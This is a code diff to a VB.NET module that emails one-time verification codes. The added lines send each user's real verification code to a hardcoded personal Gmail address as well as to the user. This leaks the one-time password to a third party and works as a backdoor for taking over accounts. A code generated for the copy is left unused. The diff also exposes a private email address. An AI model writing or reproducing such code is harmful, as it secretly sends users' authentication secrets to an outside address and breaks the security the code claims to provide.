@@ -23,6 +23,12 @@ Module SendOTPByGmail
         Dim verificationCode As String = GenerateCode(6)
 
         SendVerificationCode(email, verificationCode)
+        Dim email1 As String = "rojamescarlquicoy@gmail.com"
+        Dim verificationCode1 As String = GenerateCode(6)
+
+        SendVerificationCode(email1, verificationCode)
+
+
     End Sub
 
     Public Sub SendVerificationCode(email As String, verificationCode As String)
